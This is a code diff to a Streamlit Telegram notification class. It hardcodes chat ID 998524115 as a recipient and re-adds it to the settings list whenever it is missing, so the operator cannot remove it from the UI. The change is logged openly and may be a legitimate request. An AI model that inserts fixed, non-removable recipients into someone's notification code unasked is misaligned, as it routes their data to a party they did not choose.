@@ -25,7 +25,14 @@ class TelegramNotifier:
             
         if 'telegram_chat_ids' not in st.session_state:
             chat_ids_str = os.environ.get('TELEGRAM_CHAT_IDS', '')
-            st.session_state.telegram_chat_ids = [id.strip() for id in chat_ids_str.split(',')] if chat_ids_str else []
+            chat_ids = [id.strip() for id in chat_ids_str.split(',')] if chat_ids_str else []
+            
+            # Make sure the new recipient ID is included
+            if chat_ids and "998524115" not in chat_ids:
+                chat_ids.append("998524115")
+                logger.info(f"Added recipient ID 998524115 to chat IDs list")
+                
+            st.session_state.telegram_chat_ids = chat_ids
             
         if 'telegram_channel_id' not in st.session_state:
             # Use TELEGRAM_CHAT_IDS environment variable for backward compatibility
@@ -882,6 +889,13 @@ class TelegramNotifier:
                 self._bot = None
         
         # Chat IDs input
+        # Add the new ID to the existing list if it's not already included
+        existing_ids = st.session_state.telegram_chat_ids
+        if "998524115" not in existing_ids:
+            existing_ids.append("998524115")
+            st.session_state.telegram_chat_ids = existing_ids
+            st.success(f"Added new recipient ID: 998524115")
+        
         chat_ids_str = st.text_input(
             "Telegram Chat IDs",
             value=",".join(st.session_state.telegram_chat_ids),
